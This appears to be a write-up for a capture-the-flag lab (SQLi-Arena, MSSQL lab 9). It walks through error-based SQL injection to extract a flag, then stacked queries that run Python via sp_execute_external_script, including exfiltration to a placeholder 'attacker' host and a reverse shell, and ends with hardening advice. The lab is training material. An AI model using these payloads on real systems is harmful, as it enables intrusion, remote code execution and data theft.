<h4>Step 1: Test Normal Model Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>churn<br>
        <span class="prompt">SQL: </span>SELECT id, model_name, accuracy, last_trained FROM ml_models WHERE model_name LIKE '%churn%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>churn_predictor</strong> &nbsp;&bull;&nbsp; Accuracy: 94.20% &nbsp;&bull;&nbsp; Trained: 2026-03-23 16:22:37
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.</strong><br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- -<br>
        <span class="prompt">Output (verified -- all 5 models):</span><br>
        churn_predictor (94.20%) | fraud_detector (97.80%) | recommendation_engine (89.50%) | sentiment_analyzer (91.30%) | price_forecaster (86.70%)
    </div>
</div>

<h4>Step 3: Discover Tables and Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery + Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Find hidden tables:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('ml_models'))) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>flags</strong>' to data type int.<br><br>
        <span class="prompt">// Extract the flag:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the varchar value '<strong>FLAG{ms_py_3xt3rn4l_scr1pt}</strong>' to data type int.
    </div>
</div>

<h4>Step 4: Stacked Queries Work</h4>
<p>Stacked queries execute without error, enabling sp_execute_external_script:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Stacked Query Proof</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; EXEC sp_execute_external_script @language=N'Python', @script=N'print(1)'; -- -<br>
        <span class="prompt">Result: </span>All 5 models returned (stacked query executed without error -- sp_execute_external_script ran silently on Linux MSSQL)
    </div>
</div>

<h4>Step 5: sp_execute_external_script (Conceptual)</h4>
<p>
    MSSQL Machine Learning Services allow Python/R execution. With the right privileges,
    this provides full RCE even when xp_cmdshell and OLE Automation are disabled.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Python RCE Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Enable external scripts (if disabled):</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_configure 'external scripts enabled', 1; RECONFIGURE WITH OVERRIDE; -- -<br><br>
        <span class="prompt">// Step B: Execute OS commands via Python:</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_execute_external_script @language=N'Python', @script=N'import subprocess; result = subprocess.check_output("whoami", shell=True).decode(); print(result)'; -- -<br><br>
        <span class="prompt">// Step C: Capture output into a SQL result set:</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_execute_external_script @language=N'Python', @script=N'import pandas as pd; import subprocess; out = subprocess.check_output("whoami", shell=True).decode().strip(); OutputDataSet = pd.DataFrame({"output": [out]})', @output_data_1_name=N'OutputDataSet' WITH RESULT SETS ((output NVARCHAR(MAX))); -- -
    </div>
</div>

<h4>Step 6: Data Exfiltration via Python</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Python Exfiltration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// HTTP exfiltration:</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_execute_external_script @language=N'Python', @script=N'import urllib.request; urllib.request.urlopen("http://attacker/?data=stolen")'; -- -<br><br>
        <span class="prompt">// Reverse shell:</span><br>
        <span class="prompt">Input: </span>'; EXEC sp_execute_external_script @language=N'Python', @script=N'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["cmd"])'; -- -
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_py_3xt3rn4l_scr1pt}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab9" \<br> --data-urlencode "model=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt"># Verified output:</span><br>
        MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_py_3xt3rn4l_scr1pt}' to data type int.
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL Machine Learning Services provide a third RCE vector
    via <code>sp_execute_external_script</code>. With Python enabled, attackers get full OS
    access: command execution, file I/O, network connections, and reverse shells. This bypasses
    xp_cmdshell and OLE Automation restrictions. Disable ML Services if not needed:
    <code>sp_configure 'external scripts enabled', 0</code>. In hardened environments,
    all three RCE vectors should be disabled and the SQL account should never have sysadmin privileges.
</div>
